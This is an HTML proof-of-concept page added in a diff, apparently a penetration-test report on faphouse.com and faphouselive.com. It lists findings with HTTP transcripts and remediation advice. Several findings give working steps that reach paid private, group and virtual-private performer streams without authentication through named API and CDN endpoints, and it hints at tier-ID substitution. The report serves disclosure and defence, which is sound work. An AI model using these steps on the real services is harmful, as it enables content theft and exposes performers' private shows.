@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Inspectiv PoC — faphouse.com / faphouselive.com (FAPHS-2026)</title>
+<script src="https://cdn.jsdelivr.net/npm/hls.js@latest/dist/hls.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#080a0e;--surface:#0f1218;--surface2:#161b24;--border:#1e2533;
+  --accent:#3b82f6;--accent2:#60a5fa;
+  --critical:#ef4444;--crit-bg:rgba(239,68,68,.1);--crit-br:rgba(239,68,68,.3);
+  --high:#f97316;--high-bg:rgba(249,115,22,.1);--high-br:rgba(249,115,22,.3);
+  --medium:#eab308;--med-bg:rgba(234,179,8,.1);--med-br:rgba(234,179,8,.3);
+  --low:#22c55e;--low-bg:rgba(34,197,94,.08);--low-br:rgba(34,197,94,.25);
+  --info:#6366f1;--info-bg:rgba(99,102,241,.08);--info-br:rgba(99,102,241,.25);
+  --pub:#22c55e;--priv:#ef4444;--grp:#f97316;--vpriv:#a78bfa;
+  --text:#e2e8f0;--muted:#64748b;--muted2:#475569;
+  --mono:'IBM Plex Mono',monospace;--sans:'IBM Plex Sans',sans-serif;
+  --radius:5px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:14px;line-height:1.6;min-height:100vh}
+
+/* ── AUTH ── */
+#auth-gate{position:fixed;inset:0;background:#050810;display:flex;align-items:center;justify-content:center;z-index:9999}
+.gate-box{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:48px;width:420px;text-align:center}
+.gate-logo{font-family:var(--mono);font-size:10px;letter-spacing:.2em;color:var(--accent);text-transform:uppercase;margin-bottom:28px}
+.gate-box h2{font-size:18px;font-weight:700;color:#fff;margin-bottom:8px}
+.gate-box p{font-size:13px;color:var(--muted);margin-bottom:24px;line-height:1.6}
+.gate-box input{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius);padding:11px 14px;color:var(--text);font-family:var(--mono);font-size:14px;outline:none;margin-bottom:10px}
+.gate-box input:focus{border-color:var(--accent)}
+.gate-box button{width:100%;background:var(--accent);border:none;border-radius:var(--radius);padding:11px;color:#fff;font-family:var(--mono);font-size:12px;font-weight:700;letter-spacing:.08em;cursor:pointer}
+.gate-box button:hover{opacity:.85}
+.gate-warn{font-size:11px;color:var(--muted2);font-family:var(--mono);margin-top:14px;line-height:1.6}
+#auth-err{color:var(--critical);font-size:11px;font-family:var(--mono);min-height:14px;margin-bottom:8px}
+#app{display:none}
+
+/* ── COVER ── */
+.cover{background:linear-gradient(135deg,#050810 0%,#080a0e 50%,#0c1020 100%);border-bottom:1px solid var(--border);padding:52px 60px 44px;position:relative;overflow:hidden}
+.cover::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 85% 15%,rgba(239,68,68,.06),transparent 60%);pointer-events:none}
+.cover-label{font-family:var(--mono);font-size:10px;letter-spacing:.2em;color:var(--accent);text-transform:uppercase;margin-bottom:28px;display:flex;align-items:center;gap:10px}
+.cover-label::before{content:'';display:inline-block;width:20px;height:2px;background:var(--accent)}
+.cover h1{font-size:30px;font-weight:700;color:#fff;margin-bottom:6px}
+.cover-sub{font-size:16px;color:var(--muted);font-weight:300;margin-bottom:10px}
+.auth-badge{font-family:var(--mono);font-size:11px;color:var(--low);background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:3px;padding:5px 12px;display:inline-block;margin-bottom:28px}
+.cover-meta{display:flex;gap:32px;margin-bottom:24px;flex-wrap:wrap}
+.cm{display:flex;flex-direction:column;gap:2px}
+.cm label{font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted)}
+.cm span{font-size:13px;font-weight:500}
+.badges{display:flex;gap:10px;flex-wrap:wrap}
+.badge{font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:4px 12px;border-radius:3px;border:1px solid}
+.badge-crit{background:var(--crit-bg);border-color:var(--crit-br);color:var(--critical)}
+.badge-s2{background:rgba(249,115,22,.08);border-color:var(--high-br);color:var(--high)}
+.badge-scope{background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.3);color:var(--accent2)}
+
+/* ── LAYOUT ── */
+.main{max-width:1200px;margin:0 auto;padding:40px 36px 80px}
+section{margin-bottom:44px}
+.sec-label{font-family:var(--mono);font-size:9px;letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.sec-label::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* ── SCORECARD ── */
+.scorecard{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:36px}
+.sc{border-radius:var(--radius);padding:18px;text-align:center;border:1px solid}
+.sc.critical{background:var(--crit-bg);border-color:var(--crit-br)}
+.sc.high{background:var(--high-bg);border-color:var(--high-br)}
+.sc.medium{background:var(--med-bg);border-color:var(--med-br)}
+.sc.low{background:var(--low-bg);border-color:var(--low-br)}
+.sc.info{background:var(--info-bg);border-color:var(--info-br)}
+.sc .n{font-size:32px;font-weight:700;font-family:var(--mono);display:block}
+.sc.critical .n{color:var(--critical)}.sc.high .n{color:var(--high)}.sc.medium .n{color:var(--medium)}.sc.low .n{color:var(--low)}.sc.info .n{color:var(--info)}
+.sc .l{font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted);margin-top:4px}
+
+/* ── FINDINGS ── */
+.finding{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:16px;overflow:hidden}
+.fh{padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;gap:12px}
+.ft{font-size:14px;font-weight:600;color:#fff;flex:1}
+.fm{font-size:11px;color:var(--muted);margin-top:3px;font-family:var(--mono)}
+.fb{padding:16px 20px}
+.sev{display:inline-block;padding:3px 9px;border-radius:3px;font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;white-space:nowrap}
+.sev-critical{background:var(--crit-bg);color:var(--critical);border:1px solid var(--crit-br)}
+.sev-high{background:var(--high-bg);color:var(--high);border:1px solid var(--high-br)}
+.sev-medium{background:var(--med-bg);color:var(--medium);border:1px solid var(--med-br)}
+.sev-low{background:var(--low-bg);color:var(--low);border:1px solid var(--low-br)}
+.sev-info{background:var(--info-bg);color:var(--info);border:1px solid var(--info-br)}
+
+/* ── TERMINAL ── */
+.term{background:#050810;border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;font-family:var(--mono);font-size:11px;color:#a5b4fc;margin-bottom:12px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;line-height:1.75}
+.th{display:flex;align-items:center;gap:6px;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.td{width:9px;height:9px;border-radius:50%}
+.td-r{background:#ef4444}.td-y{background:#eab308}.td-g{background:#22c55e}
+.tn{font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:.08em}
+.tc{color:#60a5fa}.tok{color:#22c55e;font-weight:700}.terr{color:#ef4444;font-weight:700}
+.tw{color:#eab308}.tk{color:#f97316}.tv{color:#a5b4fc}.tcm{color:#475569;font-style:italic}.tu{color:#818cf8}
+
+/* ── CALLOUTS ── */
+.co{border-radius:var(--radius);padding:12px 15px;margin-bottom:10px;font-size:13px;line-height:1.6}
+.co-imp{background:rgba(249,115,22,.07);border-left:3px solid var(--high)}
+.co-fix{background:rgba(34,197,94,.07);border-left:3px solid var(--low)}
+.col{font-family:var(--mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;font-weight:700;display:block;margin-bottom:4px}
+.co-imp .col{color:var(--high)}.co-fix .col{color:var(--low)}
+code{font-family:var(--mono);font-size:11px;background:rgba(59,130,246,.1);color:var(--accent2);padding:1px 5px;border-radius:3px}
+
+/* ── STAGE DIVIDER ── */
+.stage-div{background:linear-gradient(135deg,var(--surface2) 0%,rgba(239,68,68,.04) 100%);border:1px solid var(--border);border-left:3px solid var(--critical);border-radius:var(--radius);padding:18px 24px;margin:36px 0 28px;display:flex;align-items:center;gap:18px}
+.stage-div.s2{border-left-color:var(--high)}
+.stage-n{font-family:var(--mono);font-size:26px;font-weight:700;color:var(--critical);line-height:1}
+.stage-div.s2 .stage-n{color:var(--high)}
+.stage-i h3{font-size:15px;font-weight:700;color:#fff;margin-bottom:3px}
+.stage-i p{font-size:13px;color:var(--muted)}
+
+/* ── HEADER CONTROLS ── */
+.poc-header{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap;position:sticky;top:0;z-index:50}
+.poc-header-label{font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--critical);font-weight:700}
+.ctrl-sep{width:1px;height:20px;background:var(--border)}
+
+/* ── ENUM PANEL ── */
+.enum-panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px 22px;margin-bottom:16px}
+.enum-stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-bottom:14px}
+.es{text-align:center}
+.es .n{font-family:var(--mono);font-size:20px;font-weight:700;color:var(--accent2);display:block}
+.es .n.r{color:var(--critical)}.es .n.o{color:var(--high)}.es .n.p{color:var(--pub)}.es .n.v{color:var(--vpriv)}
+.es .l{font-family:var(--mono);font-size:8px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-top:2px}
+.prog-row{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+.pb{flex:1;height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
+.pf{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:2px;transition:width .4s}
+.log-box{background:#050810;border-radius:3px;padding:8px 10px;font-family:var(--mono);font-size:10px;max-height:90px;overflow-y:auto;margin-bottom:10px}
+.log-box p{margin-bottom:1px}
+.lk{color:#22c55e}.lo{color:#f97316}.le{color:#ef4444}.li{color:#64748b}
+.ctrls{display:flex;gap:8px;flex-wrap:wrap}
+.btn{padding:7px 16px;border-radius:var(--radius);font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.08em;cursor:pointer;border:1px solid;transition:all .15s}
+.btn-go{background:var(--accent);border-color:var(--accent);color:#fff}
+.btn-go:hover{opacity:.85}
+.btn-stop{background:var(--crit-bg);border-color:var(--crit-br);color:var(--critical)}
+.btn-ghost{background:transparent;border-color:var(--border);color:var(--muted)}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent2)}
+.btn-ghost.on{border-color:var(--accent2);color:var(--accent2)}
+.active-filter{border-color:var(--accent)!important;color:var(--accent2)!important;background:rgba(59,130,246,.08)!important}
+
+/* ── TIER FILTER ROW ── */
+.tier-row{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
+.cls-btn{font-family:var(--mono);font-size:9px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:4px 10px;border-radius:3px;cursor:pointer;border:1px solid;transition:all .15s;opacity:.45}
+.cls-btn.on{opacity:1}
+.cls-pub{background:rgba(34,197,94,.1);border-color:rgba(34,197,94,.3);color:var(--pub)}
+.cls-priv{background:rgba(239,68,68,.1);border-color:rgba(239,68,68,.3);color:var(--priv)}
+.cls-grp{background:rgba(249,115,22,.1);border-color:rgba(249,115,22,.3);color:var(--grp)}
+.cls-vpriv{background:rgba(167,139,250,.1);border-color:rgba(167,139,250,.3);color:var(--vpriv)}
+
+/* ── STREAM GRID ── */
+.stream-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px}
+.tile{position:relative;aspect-ratio:16/9;border-radius:var(--radius);overflow:hidden;background:var(--surface2);border:1px solid var(--border);transition:border-color .2s}
+.tile:hover{border-color:var(--accent)}
+.tile video{width:100%;height:100%;object-fit:cover;display:block;pointer-events:none}
+.tile video.blurred{filter:blur(12px);transform:scale(1.08);transition:filter .3s,transform .3s}
+/* blur overlay icon */
+.blur-ov{position:absolute;inset:0;z-index:2;pointer-events:none;display:flex;align-items:center;justify-content:center}
+.blur-ov.off{display:none}
+.tile video.blurred~.blur-ov{display:flex}
+.blur-icon{font-family:var(--mono);font-size:9px;color:rgba(255,255,255,.45);background:rgba(8,10,14,.6);padding:3px 8px;border-radius:2px;border:1px solid rgba(255,255,255,.1)}
+/* tile overlays */
+.tile-top{position:absolute;top:5px;left:5px;right:5px;z-index:4;display:flex;align-items:flex-start;justify-content:space-between;pointer-events:none}
+.tier-badge{font-family:var(--mono);font-size:8px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:2px 7px;border-radius:2px}
+.tb-pub{background:rgba(34,197,94,.2);color:var(--pub);border:1px solid rgba(34,197,94,.35)}
+.tb-priv{background:rgba(239,68,68,.2);color:var(--priv);border:1px solid rgba(239,68,68,.35)}
+.tb-grp{background:rgba(249,115,22,.2);color:var(--grp);border:1px solid rgba(249,115,22,.35)}
+.tb-vpriv{background:rgba(167,139,250,.2);color:var(--vpriv);border:1px solid rgba(167,139,250,.35)}
+.blur-btn{background:rgba(8,10,14,.75);border:1px solid var(--border);color:var(--muted);border-radius:2px;padding:2px 6px;font-size:9px;cursor:pointer;font-family:var(--mono);transition:all .15s;pointer-events:auto}
+.blur-btn:hover{border-color:var(--accent);color:var(--accent)}
+.blur-btn.show{border-color:var(--accent2);color:var(--accent2)}
+.tile-bot{position:absolute;bottom:0;left:0;right:0;z-index:3;background:linear-gradient(transparent,rgba(8,10,14,.9));padding:16px 7px 5px;display:flex;align-items:center;gap:4px}
+.tile-name{font-family:var(--mono);font-size:9px;font-weight:700;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--text)}
+.tile-res{font-family:var(--mono);font-size:8px;color:var(--muted)}
+.mouflon-tag{font-family:var(--mono);font-size:8px;color:var(--critical);background:rgba(239,68,68,.15);padding:1px 5px;border-radius:2px}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--pub);display:inline-block;animation:pulse 2s infinite;flex-shrink:0}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+/* loading tile */
+.tile-loading{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:6px;color:var(--muted);font-family:var(--mono);font-size:10px}
+.spin{width:16px;height:16px;border:2px solid rgba(255,255,255,.1);border-top-color:var(--accent);border-radius:50%;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+
+/* ── GLOBAL BLUR TOGGLE ── */
+.blur-global{display:flex;align-items:center;gap:6px}
+.blur-global label{cursor:pointer;font-family:var(--mono);font-size:9px;text-transform:uppercase;color:var(--muted)}
+.toggle{position:relative;width:32px;height:17px;cursor:pointer;display:inline-block}
+.toggle input{display:none}
+.toggle-track{position:absolute;inset:0;background:var(--border);border-radius:9px;transition:.2s}
+.toggle input:checked~.toggle-track{background:var(--accent2)}
+.toggle-thumb{position:absolute;top:2px;left:2px;width:13px;height:13px;background:#fff;border-radius:50%;transition:.2s}
+.toggle input:checked~.toggle-thumb{left:17px}
+
+/* ── SUBSCRIPTION GRID ── */
+.sub-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px}
+.sub-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px}
+.sub-card h4{font-family:var(--mono);font-size:10px;color:var(--accent2);letter-spacing:.12em;text-transform:uppercase;margin-bottom:12px}
+.pkg-row{border-bottom:1px solid rgba(30,37,51,.7);padding:7px 0;display:flex;justify-content:space-between;font-size:12px}
+.pkg-row:last-child{border-bottom:none}
+.pkg-id{font-family:var(--mono);color:var(--critical);font-size:11px}
+.big-num{font-size:28px;font-weight:700;font-family:var(--mono);color:var(--critical);display:block;margin-bottom:3px}
+footer{background:var(--surface);border-top:1px solid var(--border);padding:16px 60px;display:flex;justify-content:space-between;align-items:center;font-family:var(--mono);font-size:10px;color:var(--muted)}
+.live-ind{display:flex;align-items:center;gap:5px;color:var(--low)}
+</style>
+</head>
+<body>
+
+<!-- AUTH GATE -->
+<div id="auth-gate">
+  <div class="gate-box">
+    <div class="gate-logo">Inspectiv Security Research</div>
+    <h2>Authorized PoC — Restricted Access</h2>
+    <p>Security research material from an authorized penetration test.<br>Engagement: FAPHS-2026 — SOW on file</p>
+    <div id="auth-err"></div>
+    <input type="password" id="gpass" placeholder="Enter passphrase" onkeydown="if(event.key==='Enter')checkAuth()">
+    <button onclick="checkAuth()">ACCESS DOCUMENT</button>
+    <div class="gate-warn">CONFIDENTIAL — Inspectiv INS-2026-FAPHS-001<br>Unauthorized access or distribution prohibited.</div>
+  </div>
+</div>
+
+<div id="app">
+
+<!-- STICKY HEADER CONTROLS (Stage 2) -->
+<div class="poc-header" id="poc-controls" style="display:none">
+  <span class="poc-header-label">&#9632; FAPHS-2026 LIVE</span>
+  <div class="ctrl-sep"></div>
+  <div class="blur-global">
+    <label for="globalBlurToggle">BLUR</label>
+    <label class="toggle">
+      <input type="checkbox" id="globalBlurToggle" checked onchange="setGlobalBlur(this.checked)">
+      <div class="toggle-track"></div><div class="toggle-thumb"></div>
+    </label>
+  </div>
+  <div class="ctrl-sep"></div>
+  <span style="font-family:var(--mono);font-size:9px;color:var(--muted)">
+    <span id="hdr-total">—</span> performers &nbsp;|&nbsp;
+    <span id="hdr-paid" style="color:var(--high)">—</span> paid tiers live &nbsp;|&nbsp;
+    <span id="hdr-manifests" style="color:var(--low)">—</span> manifests HTTP 200
+  </span>
+  <div class="ctrl-sep"></div>
+  <button class="btn btn-ghost" style="padding:4px 10px;font-size:9px" onclick="scrollToFindings()">&#8593; FINDINGS</button>
+  <button class="btn btn-ghost" style="padding:4px 10px;font-size:9px" onclick="scrollToGrid()">&#8595; STREAMS</button>
+</div>
+
+<!-- COVER -->
+<div class="cover">
+  <div class="cover-label">Inspectiv Security Research</div>
+  <h1>Proof of Concept</h1>
+  <div class="cover-sub">faphouse.com &amp; faphouselive.com — Unauthenticated Premium Content Access</div>
+  <div class="auth-badge">&#10003; Authorized — SOW INS-2026-FAPHS-001 — Internet scope — P1+P2</div>
+  <div class="cover-meta">
+    <div class="cm"><label>Engagement</label><span>FAPHS-2026</span></div>
+    <div class="cm"><label>Date</label><span>April 2026</span></div>
+    <div class="cm"><label>Researcher</label><span>Inspectiv / Ken Bane</span></div>
+    <div class="cm"><label>Targets</label><span>faphouse.com · faphouselive.com</span></div>
+  </div>
+  <div class="badges">
+    <span class="badge badge-crit">Stage 1 — Evidence</span>
+    <span class="badge badge-s2">Stage 2 — Live Demo</span>
+    <span class="badge badge-scope">43 Confirmed Findings</span>
+  </div>
+</div>
+
+<div class="main">
+
+<!-- STAGE 1 -->
+<div class="stage-div" id="findings-anchor">
+  <div class="stage-n">1</div>
+  <div class="stage-i"><h3>Vulnerability Evidence</h3>
+  <p>HTTP responses confirming unauthenticated access to paid stream delivery infrastructure, subscriber pricing, and performer data. No credentials. No session. No API keys.</p></div>
+</div>
+
+<section>
+  <div class="sec-label">Finding Summary</div>
+  <div class="scorecard">
+    <div class="sc critical"><span class="n">4</span><div class="l">Critical</div></div>
+    <div class="sc high"><span class="n">4</span><div class="l">High</div></div>
+    <div class="sc medium"><span class="n">9</span><div class="l">Medium</div></div>
+    <div class="sc low"><span class="n">13</span><div class="l">Low</div></div>
+    <div class="sc info"><span class="n">12</span><div class="l">Info</div></div>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label">Critical Findings</div>
+
+  <div class="finding">
+    <div class="fh"><span class="sev sev-critical">Critical</span><div><div class="ft">F-01 — faphouse.com Expires April 15, 2026 — Registrar Name.com — Auto-Renew Unconfirmed — Split DNS/Registration Management</div><div class="fm">faphouse.com &nbsp;|&nbsp; rdap.verisign.com &nbsp;|&nbsp; Domain Expiry Risk</div></div></div>
+    <div class="fb">
+      <div class="term"><div class="th"><span class="td td-r"></span><span class="td td-y"></span><span class="td td-g"></span><span class="tn">RDAP QUERY — rdap.verisign.com/com/v1/domain/faphouse.com</span></div><span class="tc">GET https://rdap.verisign.com/com/v1/domain/faphouse.com</span>
+<span class="tok">HTTP/1.1 200 OK</span>
+
+<span class="tk">ldhName:</span>      <span class="tv">faphouse.com</span>
+<span class="tk">status:</span>       <span class="tv">client transfer prohibited</span>
+<span class="tk">registration:</span> <span class="tv">2021-04-15T19:56:10Z</span>
+<span class="tk">expiration:</span>   <span class="tw">2026-04-15T19:56:10Z  ← EXPIRES IN ~12 DAYS at 19:56 UTC</span>
+<span class="tk">registrar:</span>    <span class="tw">Name.com, Inc. (IANA ID 625)  ← NOT Cloudflare Registrar</span>
+<span class="tk">nameservers:</span>  <span class="tv">jake.ns.cloudflare.com / nia.ns.cloudflare.com</span>
+
+<span class="tcm">Auto-renew status: NOT visible via RDAP — internal registrar billing flag only.</span>
+<span class="tcm">SPLIT MANAGEMENT: Registered at Name.com. DNS managed at Cloudflare.</span>
+<span class="tcm">Renewal notices go to Name.com billing contact — not Cloudflare dashboard.</span></div>
+      <div class="co co-imp"><span class="col">Impact</span>Domain lapse path: active until 19:56 UTC Apr 15 → auto-renew grace ~30 days (domain functions, recoverable) → redemption (DNS goes dark, $80–150 fee) → pending delete 5 days (unrecoverable) → drop (caught within seconds). A platform with 1.37M premium subscribers and active payment flows cannot safely lapse. The Name.com/Cloudflare split means renewal notices route to Name.com billing — which may not be the active admin.</div>
+      <div class="co co-fix"><span class="col">Remediation</span>Log into Name.com (not Cloudflare). Verify billing card. Enable auto-renew. Manually renew before April 15. Do not rely on Cloudflare notifications — registration is at Name.com.</div>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="fh"><span class="sev sev-critical">Critical</span><div><div class="ft">F-19 — 7,915 Performer Records Returned Unauthenticated Including HLS Stream URLs for Paid Private, Group, and Virtual Private Shows</div><div class="fm">vr.faphouselive.com/api/vr/v2/models &nbsp;|&nbsp; Performer Directory API &nbsp;|&nbsp; Unauthenticated Data Exposure</div></div></div>
+    <div class="fb">
+      <div class="term"><div class="th"><span class="td td-r"></span><span class="td td-y"></span><span class="td td-g"></span><span class="tn">GET /api/vr/v2/models — zero credentials</span></div><span class="tc">GET https://vr.faphouselive.com/api/vr/v2/models</span>
+<span class="tok">HTTP/1.1 200 OK</span>
+<span class="tk">Content-Type:</span>  <span class="tv">application/json; charset=utf-8</span>
+<span class="tk">Access-Control-Allow-Origin:</span> <span class="tw">*</span>
+<span class="tk">Response size:</span> <span class="tv">8,241,692 bytes (8.2 MB)</span>
+
+<span class="tk">performers_total:</span> <span class="tw">7,915</span>
+<span class="tk">show_breakdown:</span>
+  <span class="tv">publicChat:      7,453</span>  <span class="tcm">← free tier</span>
+  <span class="tw">privateChat:       234</span>  <span class="tcm">← paid $/min — HLS URL included</span>
+  <span class="tw">groupShow:         123</span>  <span class="tcm">← ticket-gated — HLS URL included</span>
+  <span class="tw">virtualPrivate:    112</span>  <span class="tcm">← premium rate — HLS URL included</span>
+
+<span class="tk">fields_per_performer:</span>
+  <span class="tv">username, country, gender, isLive, showType,</span>
+  <span class="tw">hlsPlaylist,</span>  <span class="tcm">← direct delivery URL — no auth required to use</span>
+  <span class="tv">privateRate, spyRate, groupRate, ticketRate,</span>
+  <span class="tv">broadcastSettings, previewImages[], biography, languages, tags</span></div>
+      <div class="co co-imp"><span class="col">Impact</span>Every live performer including those in paid sessions is returned with their direct HLS delivery URL and per-minute rates. This is the enumeration surface for F-20 — the full stream pipeline access bypass.</div>
+      <div class="co co-fix"><span class="col">Remediation</span>Require auth on /api/vr/v2/models. Unauthenticated callers: return only publicChat, omit hlsPlaylist entirely, omit per-minute rates.</div>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="fh"><span class="sev sev-critical">Critical</span><div><div class="ft">F-20 — HLS Delivery Chain Zero-Auth Across All Tiers — Private, Group, Virtual Private Shows Accessible Without Payment</div><div class="fm">manifest.naiadsystems.com · edge-hls.doppiocdn.com · media-hls.doppiocdn.com &nbsp;|&nbsp; Three-Layer HLS Pipeline &nbsp;|&nbsp; Payment Bypass</div></div></div>
+    <div class="fb">
+      <div class="term"><div class="th"><span class="td td-r"></span><span class="td td-y"></span><span class="td td-g"></span><span class="tn">THREE-LAYER PIPELINE — all layers HTTP 200, no authentication</span></div><span class="tcm">LAYER 1 — manifest.naiadsystems.com</span>
+<span class="tc">GET https://manifest.naiadsystems.com/live/s:{stream_id}/index.m3u8</span>
+<span class="tok">HTTP/1.1 200 OK</span>  <span class="tk">CORS:</span> <span class="tw">*</span>
+<span class="tv">#EXTM3U
+#EXT-X-MOUFLON:{token}</span>  <span class="tw">← present but NOT enforced at CDN</span>
+<span class="tv">#EXT-X-STREAM-INF:BANDWIDTH=500000,RESOLUTION=426x240
+  https://edge-hls.doppiocdn.com/hls/{id}/master/{id}_240p.m3u8
+#EXT-X-STREAM-INF:BANDWIDTH=1400000,RESOLUTION=1280x720
+  https://edge-hls.doppiocdn.com/hls/{id}/master/{id}_720p.m3u8</span>
+
+<span class="tcm">LAYER 2 — edge-hls.doppiocdn.com</span>
+<span class="tc">GET https://edge-hls.doppiocdn.com/hls/{id}/master/{id}_720p.m3u8</span>
+<span class="tok">HTTP/1.1 200 OK</span>  <span class="tk">CORS:</span> <span class="tw">*</span>
+
+<span class="tcm">LAYER 3 — media-hls.doppiocdn.com (segments)</span>
+<span class="tc">GET https://media-hls.doppiocdn.com/hls/{id}/{seg}.m4s</span>
+<span class="tok">HTTP/1.1 200 OK</span>  <span class="tk">Content-Type:</span> <span class="tv">video/mp4</span>
+
+<span class="tcm">TIER COVERAGE CONFIRMED:</span>
+<span class="tv">PUBLIC (publicChat):     </span><span class="tok">200 OK</span>  <span class="tcm">expected</span>
+<span class="tw">PRIVATE (privateChat):   </span><span class="tok">200 OK</span>  <span class="tw">paywall bypassed — viewers paying $/min</span>
+<span class="tw">GROUP (groupShow):       </span><span class="tok">200 OK</span>  <span class="tw">paywall bypassed — ticket required</span>
+<span class="tw">VIRTUAL PRIVATE:         </span><span class="tok">200 OK</span>  <span class="tw">paywall bypassed — premium rate tier</span></div>
+      <div class="co co-imp"><span class="col">Impact</span>Every paid session type is fully accessible without credentials. The MOUFLON token field is present in the manifest but unenforced at the Bottlenose CDN delivery layer. The stream UUID does not rotate on classification change — access obtained during a public phase persists through a transition to paid. Revenue loss scales with platform traffic.</div>
+      <div class="co co-fix"><span class="col">Remediation</span>Token-signed manifest and segment URLs at the Bottlenose CDN layer. Tokens must be short-lived (≤300s), session-bound, tier-validated server-side. Enforce the MOUFLON field at CDN origin. Remove hlsPlaylist from unauthenticated API responses. Rotate stream UUID on public→paid transitions.</div>
+    </div>
+  </div>
+
+  <div class="finding">
+    <div class="fh"><span class="sev sev-critical">Critical</span><div><div class="ft">F-02 — Subscription Architecture + Internal Tier Configuration Fully Exposed Unauthenticated (1.37M VOD, tierConfigurationIds, Payment Stack)</div><div class="fm">faphouse.com/api/premium/get-packages &nbsp;|&nbsp; Subscription API &nbsp;|&nbsp; Business Logic Exposure</div></div></div>
+    <div class="fb">
+      <div class="term"><div class="th"><span class="td td-r"></span><span class="td td-y"></span><span class="td td-g"></span><span class="tn">GET /api/premium/get-packages — no credentials</span></div><span class="tc">GET https://faphouse.com/api/premium/get-packages</span>
+<span class="tok">HTTP/1.1 200 OK</span>  <span class="tv">9,549 bytes</span>
+
+<span class="tk">"tierId":</span>             <span class="tw">23</span>
+<span class="tk">"tierTitle":</span>          <span class="tw">"16.99 tier"</span>
+<span class="tk">"premiumVideosCount":</span> <span class="tw">1,371,008</span>  <span class="tcm">← full catalogue size</span>
+<span class="tk">"tierConfigurationIds":</span> <span class="tw">[260, 262, 265]</span>  <span class="tcm">← P3 entitlement targets</span>
+<span class="tk">"accessLevel strings":</span>  <span class="tw">["premium_lite", "ultra"]</span>
+<span class="tk">"methods":</span> <span class="tw">["RocketGate","Epoch","CoinGate","PayGarden","CentroBill"]</span></div>
+      <div class="co co-imp"><span class="col">Impact</span>Complete internal subscription architecture exposed: internal IDs used in entitlement decisions, access level strings used in authorization checks, full payment processor stack, exact catalogue size. tierConfigurationIds (260, 262, 265) are P3 targets — substituting a higher-tier ID in an authenticated request may upgrade access without payment.</div>
+      <div class="co co-fix"><span class="col">Remediation</span>Strip internal IDs, access level strings, payment processor names, and catalogue counts from unauthenticated responses. Return only public-facing price/duration/tier name.</div>
+    </div>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label">High Findings</div>
+  <div class="finding"><div class="fh"><span class="sev sev-high">High</span><div><div class="ft">F-03 — faphouselive.com: No Content Security Policy — XSS Fully Unmitigated</div><div class="fm">faphouselive.com &nbsp;|&nbsp; HTTP Headers &nbsp;|&nbsp; Missing Security Controls</div></div></div>
+  <div class="fb"><div class="term"><span class="tc">GET https://faphouselive.com/</span>  <span class="tok">200 OK</span>
+<span class="tk">Content-Security-Policy:</span>  <span class="terr">ABSENT</span>
+<span class="tk">X-Frame-Options:</span>          <span class="terr">ABSENT</span>
+<span class="tk">X-Content-Type-Options:</span>   <span class="terr">ABSENT</span>
+<span class="tcm">All standard security headers absent. Any XSS is uncontained browser-wide.</span></div>
+  <div class="co co-imp"><span class="col">Impact</span>XSS on any surface enables session hijack, subscriber payment exfiltration, and affiliate commission manipulation. No browser-level mitigation exists.</div>
+  <div class="co co-fix"><span class="col">Remediation</span>Deploy CSP report-only then enforce. Add X-Frame-Options: DENY, X-Content-Type-Options: nosniff.</div></div></div>
+
